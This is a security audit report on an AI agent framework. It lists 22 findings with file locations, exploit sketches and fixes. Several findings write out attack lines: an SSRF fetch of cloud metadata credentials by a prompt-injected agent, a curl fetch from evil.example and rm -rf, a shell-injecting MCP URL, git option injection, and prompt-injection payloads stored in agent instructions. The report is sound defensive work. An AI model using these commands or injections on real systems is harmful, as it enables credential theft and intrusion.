# DzupAgent Security Audit — 2026-05-05 (run-001)

Scope: 32 packages under `dzupagent/packages/*`, ~2670 TS files.
Methodology: OWASP Top-10 + agent-framework-specific checks. Static analysis via grep/read.
Excluded: findings already covered in `audit/full-agent-agent-adapters-2026-05-05/run-001/` unless they replicate in OTHER packages, and the Phase 1+2 sprint items already landed on 2026-05-05.

---

## 1. Summary by Severity

| Severity | Count |
|---|---|
| Critical | 2 |
| High     | 6 |
| Medium   | 9 |
| Low      | 5 |
| Total    | 22 |

---

## 2. Confirmed Prior-Sprint Fixes (verified by grep)

| Ticket   | File / Line | Status |
|---|---|---|
| H-01 workspace-write → bypassPermissions tightened | `packages/agent-adapters/src/claude/claude-adapter.ts:139-143,689` (workspace-write maps to `'default'`, only `full-access` → `'bypassPermissions'`); `packages/agent-adapters/src/policy/policy-compiler.ts:118` | LANDED |
| C-01 prompt caching | `packages/agent-adapters/src/claude/claude-adapter.ts:427-436,698`; `extract-token-usage.ts:23,50` (`cacheReadTokens`/`cacheWriteTokens` split); `packages/agent/src/agent/run-engine.ts:524-525`; `packages/agent/src/observability/event-bus-bridge.ts:79-80` | LANDED |
| REC-002 git-arg injection | `packages/codegen/src/git/git-executor.ts:344` uses `execFile('git', args)` (no shell). `packages/codegen/src/git/git-worktree.ts:127` same. shell:true grep returns 0 hits across packages. Note: argument-injection of leading-`-` ref names not yet validated (SEC-12 below). | PARTIAL |
| REC-003 bootstrap risk-tier bug | Cross-package grep clean; no reverted code path observed. | LANDED (visual) |
| H-02..H-10 (boundary, cast, listener leak, config mutation) | Multiple touchpoints in `agent`/`agent-adapters` per prior sprint memo. Re-verifying all 9 is out-of-scope for this audit; spot-checks of `as never` count and listener cleanup in `process-helpers.ts:96-103,164` show the patterns described. | ASSUMED LANDED |

---

## 3. Top 5 Critical / High

1. **SEC-01 (Critical)** — `/api/approvals/:runId/:approvalId/grant|reject` has no ownership/tenant check. Any authenticated key can resolve any pending approval.
2. **SEC-02 (Critical)** — Learning routes (`packages/server/src/routes/learning.ts`) read tenant from `c.get('tenantId')` which is never set by the auth middleware in production, so all callers fall through to `defaultTenantId`. All learning data (lessons, rules, skills, feedback) is shared across tenants.
3. **SEC-03 (High)** — `packages/scraper/src/http-fetcher.ts` and `scraper.ts` fetch arbitrary URLs with no allowlist or private-IP/loopback/metadata-IP filter. SSRF to `169.254.169.254`, `localhost`, internal services.
4. **SEC-04 (High)** — Express adapter (`packages/express/src/agent-router.ts`) has no Zod, no body-size cap, no rate limit, no message length cap; raw `error.message` leaks to client; chat body is forwarded directly to the LLM as a `HumanMessage`.
5. **SEC-05 (High)** — 19+ Hono routes in `packages/server/src/routes/*` use `c.req.json<TypeCast>()` instead of Zod parsing (e.g. `agents.ts:58`, `benchmarks.ts:251`, `clusters.ts:27`, `deploy.ts:102`, `human-contact.ts:26`, `learning.ts:359/445/553`, `mailbox.ts:27`, `mcp.ts:200/372`, `personas.ts`, `presets.ts`, `prompts.ts`, `registry.ts`, `schedules.ts`). Type assertions are not runtime validation.

---

## 4. Full Findings List

### Critical

#### SEC-01 — Cross-tenant approval bypass on /api/approvals/* (Critical, A01 Broken Access Control)
- File: `packages/server/src/routes/approvals.ts:36-78`
- Issue: Unlike `routes/approval.ts` which calls `requireOwnedRun`, `routes/approvals.ts` calls `approvalStore.grant/reject(runId, approvalId, …)` directly with no ownership/tenant guard. The 404 is only raised when the (runId,approvalId) pair is unknown to the store.
- Exploit: Tenant A's API key submits `POST /api/approvals/<TenantB-runId>/<approvalId>/grant` once it learns/guesses any pending approval id; `ApprovalGate.poll` resolves and the run continues. This bypasses the entire HITL gate.
- Fix: Resolve the run via `runStore.get(runId)`; reject when `run.ownerId/tenantId` differs from the calling key. Or store ownership inside `ApprovalStateStore` and check it on grant/reject.

#### SEC-02 — learning.ts uses unset `tenantId` context, all tenants share scope (Critical, A01)
- File: `packages/server/src/routes/learning.ts:120-126,130-131,217-220,243-244,274-275,355-365`
- Issue: `function getTenantId(c) { return c.get('tenantId') ?? defaultTenantId }`. The auth middleware (`packages/server/src/middleware/auth.ts:70`) sets `apiKey`, never `tenantId`. Only test files set `c.set('tenantId', …)`. In production every tenant resolves to `defaultTenantId`, so `tenantScope(tenantId)` collapses to a single shared scope across all callers.
- Exploit: A2's lessons/rules/skills/feedback/trajectories are visible and writable by A1 once both hit any learning route.
- Fix: Re-use `defaultResolveAuthScope` from `routes/memory-tenant-scope.ts` (which reads `c.get('apiKey').tenantId`). Add a regression test that runs two distinct API keys against `GET /dashboard` and asserts disjoint results.

### High

#### SEC-03 — Scraper has no SSRF guard (High, A10 SSRF)
- File: `packages/scraper/src/http-fetcher.ts:55-85,88-…`; `packages/scraper/src/scraper.ts:180-190`
- Issue: `fetch(url, …)` accepts any URL passed by the caller (and ultimately by the LLM if exposed as a tool). No host allowlist, no `isPrivateIp` / `isLoopback` / `169.254.169.254` block. `connectors/src/http/http-connector.ts` *does* implement a guard — scraper does not.
- Exploit: A prompt-injected agent calls `scrape("http://169.254.169.254/latest/meta-data/iam/security-credentials/")` and exfiltrates AWS credentials, or hits `http://localhost:8080/admin` on the host.
- Fix: Port the SSRF guard pattern from `http-connector.ts`. Reject loopback / link-local / RFC1918 / IPv6 ULA / DNS rebinding; require an allowlist when `process.env.NODE_ENV === 'production'`.

#### SEC-04 — Express adapter has no input validation, body limits, rate limit, or error sanitization (High, A03/A04/A05)
- File: `packages/express/src/agent-router.ts:65-115,119-172`
- Issue: 1) only `typeof body.message === 'string'` check — no length cap (LLM cost DoS); 2) `agentName` cast from `body.agentName` with no allow-list (defaults to `Object.keys(agents)[0]` so not severe, but still); 3) raw `error.message` returned in 500 responses leaks internal details (file paths, DB error fragments); 4) no body-size limit unless host adds `express.json({ limit })`; 5) zero rate limiting.
- Exploit: Single attacker can submit `{ "message": "<5MB string>" }` repeatedly, billing the LLM provider. 500s leak stack frame contents.
- Fix: `express.json({ limit: '256kb' })`, Zod schema for body, length cap on `message` (e.g. 32 KB), `express-rate-limit` on `/chat*`, generic 500 message ("Internal error"), log the real error server-side only.

#### SEC-05 — Server routes parse JSON via type-cast instead of Zod (High, A03 Injection / A08 Data Integrity)
- File: 19+ files in `packages/server/src/routes/*`. Examples:
  - `agents.ts:58` — `Partial<{ name; description; instructions; … }>` via cast — `instructions` is forwarded into LLM prompts.
  - `clusters.ts:27,85,146` — admin routes (cluster create / scale / decommission) accept arbitrary fields.
  - `mcp.ts:200,372` — MCP server registration patch / profile import; no schema beyond type cast (relies on later `validateMcpExecutablePath`).
  - `personas.ts`, `prompts.ts`, `presets.ts`, `schedules.ts` — admin/operator surfaces.
  - `learning.ts:359,445,553` — `(await c.req.json()) as Record<string,unknown>` then ad-hoc validation.
- Exploit: prototype pollution / type confusion / oversized fields slipping past handlers; `instructions: ' …<prompt-injection payload>… '` saved verbatim and replayed into every run.
- Fix: Land a Zod schema per body type, parse with `.safeParse`, reject 400 on failure. Mirror the pattern already used in `routes/runs.ts` (`RunCreateSchema`) and `routes/memory.ts`.

#### SEC-06 — No SSRF / private-IP guard on connectors HTTP fallback (High, A10)
- File: `packages/connectors/src/http/http-connector.ts:62-110` does enforce `allowedHosts`/origin pinning — BUT the guard is satisfied as long as `allowedHosts` is non-empty; there is no built-in IP-literal block. A misconfiguration with `allowedHosts: ['*']` (or unset+absolute URLs in legacy code paths) re-opens SSRF.
- Exploit: depends on host config; rated High because the same surface is consumed by tool-call code paths in `connectors-browser` and others.
- Fix: Add a hard secondary check that rejects loopback / link-local / RFC1918 even when `allowedHosts` matches a hostname that resolves to those.

#### SEC-07 — `LocalWorkspace.runCommand` has no default command allowlist (High, A03)
- File: `packages/codegen/src/workspace/local-workspace.ts:210-218`
- Issue: `if (allowedCommands && …)` — the guard is bypassed entirely when `allowedCommands` is undefined. A `Workspace` consumed by a tool can therefore exec any binary on PATH.
- Exploit: An agent receives `runCommand('curl', ['evil.example/x.sh'])` or `runCommand('rm', ['-rf', '/'])` (within sandbox cwd).
- Fix: Default `allowedCommands` to a conservative list (e.g. `['git','node','npm','yarn','pnpm','tsc','eslint','prettier','jest','vitest','rg','grep','find']`) or default to deny when the field is absent. Document the opt-out.

#### SEC-08 — Default `maxIterations = 10` is large for low-trust callers; no default cost ceiling (High, A04 Insecure Design)
- File: `packages/agent/src/agent/run-engine.ts:186-193`
- Issue: `maxIterations ?? 10`; no default `IterationBudget` (`budget` only created when `config.guardrails` is set). No default token / cost ceiling — if a host wires an agent without configuring `guardrails`, an attacker can run 10 LLM tool-loops × 4096 tokens with no provider-side cost cap.
- Fix: Land a conservative default budget (e.g. 50k input + 50k output tokens) when `guardrails` is undefined; consider lowering default `maxIterations` to 5 for un-guardrailed runs.

### Medium

#### SEC-09 — Server global error handler logs raw `err.message` to console (Medium, A09 Logging)
- File: `packages/server/src/composition/middleware.ts:386-396`
- Issue: `console.error(\`[ForgeServer] ${c.req.method} ${c.req.path}: ${message}\`)` where `message = err.message`. Driver errors (e.g. `pg: password authentication failed for user "dzup_admin" with hash …`) and ad-hoc thrown strings can carry tokens.
- Fix: Route through a structured logger that runs the existing `redact*` helpers; emit error code + stack trace only, never `err.message` at INFO level.

#### SEC-10 — Auth middleware does not constant-time compare API key tokens (Medium, A02)
- File: `packages/server/src/middleware/auth.ts:52-69`; `packages/server/src/persistence/api-key-store.ts:131-149`
- Issue: Validation hashes the raw key (good) and looks up by `eq(apiKeys.keyHash, keyHash)`. The token slice (`authHeader.slice(7)`) is logged via the global error handler when an upstream throws; no constant-time comparison anywhere. Risk is low (random 32-byte keys + DB lookup, not user-supplied hash compare) but worth documenting.
- Fix: Wrap the lookup in a helper that always takes ~constant DB time, and ensure auth-middleware errors never include the bearer slice.

#### SEC-11 — `git-executor` accepts caller-supplied refs without `--end-of-options` separator (Medium, A03)
- File: `packages/codegen/src/git/git-executor.ts:285-336`
- Issue: `commit(message)` → `git commit -m message`; `createBranch(name, startPoint)` → `git checkout -b <name> <startPoint>`. `execFile` (no shell) blocks shell injection but git itself parses arguments starting with `-` as flags. A name like `--upload-pack=/tmp/x.sh` or `-c core.fsmonitor=…` is accepted.
- Exploit: caller passes `--exec=…` style options that change git's behaviour. Higher impact than REC-002 originally addressed because `commit`/`createBranch`/`switchBranch` accept pure caller strings.
- Fix: Validate refs with a strict regex (`/^[A-Za-z0-9._\/-]+$/` minus leading `-`); insert `--end-of-options` (Git ≥2.24) or `--` before user-supplied positionals.

#### SEC-12 — `git-worktree` branch and merge args also unprotected (Medium, A03)
- File: `packages/codegen/src/git/git-worktree.ts:52-66,110-115`
- Issue: Same as SEC-11. `worktree add -b <branchName>`, `merge <worktreeBranch> --no-edit`. branchName flows from caller.
- Fix: Same regex/`--end-of-options`.

#### SEC-13 — `applyRequestMetrics` records full URL path as a metric label (Medium, A09 Logging cardinality + PII)
- File: `packages/server/src/composition/middleware.ts:369-383`
- Issue: `c.req.path` includes path params like `:id`, `:runId`, `:tenantId`, plus user-controllable query under some routers. Labels with high cardinality blow up Prom storage; labels with PII leak into metrics.
- Fix: Map to the route template (e.g. `/api/runs/:id`), not the resolved path. Hono exposes `c.req.routePath`.

#### SEC-14 — `routes/learning.ts` validates body field-by-field (Medium, A03)
- File: `packages/server/src/routes/learning.ts:355-380,440-…,548-…`
- Issue: 3 POST handlers parse `(await c.req.json()) as Record<string, unknown>` then check fields one at a time — easy to miss a field, and oversized strings flow through (the global JSON body limit is 1 MiB by default).
- Fix: Replace with Zod schemas. While there, cap individual string lengths (e.g. `feedback.runId` to 128 chars).

#### SEC-15 — Memory at-rest encryption is opt-in (Medium, A02 Cryptographic Failures)
- File: `packages/memory/src/encryption/*` exists but every memory store can be constructed without `EncryptedMemoryService`. No warning is emitted when a production deployment runs an unencrypted memory store.
- Fix: When `NODE_ENV === 'production'` and `EncryptedMemoryService` is not wrapped around the store, emit a startup warning equivalent to `FRAMEWORK_API_AUTH_WARNING`.

#### SEC-16 — `mcp-client.spawnWithStdin` does not enforce a wall-clock timeout (Medium, A04)
- File: `packages/core/src/mcp/mcp-client.ts:432-479`
- Issue: `spawn(config.url, …, { timeout })`; Node's spawn `timeout` option fires SIGTERM but the JS Promise has no `AbortSignal`-based fallback. If the child ignores SIGTERM (no SIGKILL escalation here, unlike `process-helpers.ts`), the request hangs.
- Fix: Add the same SIGTERM→SIGKILL escalation pattern as `process-helpers.ts:88-101`.

#### SEC-17 — `routes/mcp.ts` patch does not re-validate executable URL on update (Medium, A03)
- File: `packages/server/src/routes/mcp.ts:196-222`
- Issue: PATCH accepts a `McpServerPatch` (typed-cast only) and persists it. `validateMcpExecutablePath` runs only inside `mcp-client.spawnWithStdin` at run time. A malicious patch with `url: '/bin/sh -c "$(curl evil)"'` is stored; it would be rejected at first connect, but operators reading the registry might be confused.
- Fix: Run `validateMcpExecutablePath(patch.url)` at PATCH time when `url` changes.

### Low

#### SEC-18 — Default JSON body limit is 1 MiB; some routes raise to 8 MiB (Low, A04)
- File: `packages/server/src/composition/middleware.ts:32-38`
- 1 MiB / 8 MiB ceilings with no per-tenant tracking. Document the impact on cost-DoS.

#### SEC-19 — `c.set('apiKey' as never, …)` in `auth.ts:70` (Low, code quality / type-safety)
- File: `packages/server/src/middleware/auth.ts:70`
- The `as never` cast is a known weakness from the agent+adapters audit; same pattern repeats here.
- Fix: Add typed Hono `Variables` interface for the app.

#### SEC-20 — `hierarchical-walker.ts:93` shells out to `git rev-parse` via `execSync` (Low, A09)
- File: `packages/core/src/skills/hierarchical-walker.ts:93-101`
- `execSync` is synchronous and blocks the event loop. Not exploitable — `cwd` is caller-supplied but `git` runs without untrusted args. Replace with `execFile`.

#### SEC-21 — `process-helpers.ts:25` uses `which` (Low)
- File: `packages/agent-adapters/src/utils/process-helpers.ts:25`
- `await execFileAsync('which', [name])` works on Linux/macOS but not Windows. Not security; portability only. Mentioned for the Coolify deploy target.

#### SEC-22 — Dependency CVE audit not run in this audit (Low, A06)
- `yarn` shim resolves to yarn 1 in this env (corepack misconfig). Could not run `yarn npm audit --severity high --recursive` in-band. Recommend running it from a fresh shell with corepack enabled, and gate CI on it.

---

## 5. Quick Wins (1–2 h)

- SEC-01 — wire `requireOwnedRun` into `approvals.ts` (~30 min).
- SEC-02 — replace `getTenantId` with `defaultResolveAuthScope` (~45 min) + 1 regression test.
- SEC-09 — drop raw `err.message` from `composition/middleware.ts:386-396` (~15 min).
- SEC-13 — switch metric label to `c.req.routePath` (~30 min).
- SEC-17 — call `validateMcpExecutablePath` on PATCH (~20 min).
- SEC-18/19 — Hono Variables types + body-limit constant (~1 h).
- SEC-20 — replace `execSync` with `execFile` (~15 min).

## 6. Refactors (4–8 h)

- SEC-04 — full Express adapter hardening (Zod + length caps + rate limit + error sanitization) (~4 h).
- SEC-07 — workspace command default-deny + per-tier allowlist registry (~4 h).
- SEC-08 — default budget plumbing + tests (~4 h).
- SEC-11/12 — git ref validator + `--end-of-options` everywhere (~3 h, includes tests).
- SEC-14 — full learning routes Zod migration (~4 h).
- SEC-16 — MCP stdio SIGKILL escalation (~2 h).

## 7. Major (16 h+)

- SEC-03 — scraper SSRF guard (port from `http-connector`, add private-IP/loopback/metadata-IP block, DNS rebinding mitigation, allowlist mode for prod) + integration tests + docs (~16 h).
- SEC-05 — Zod everywhere across `packages/server/src/routes/*.ts` (19+ files), generated TS types, contract tests (~24 h).
- SEC-15 — make encrypted memory the default in `MemoryServiceFactory`, with a key-rotation runbook (~16 h).

---

End of report.
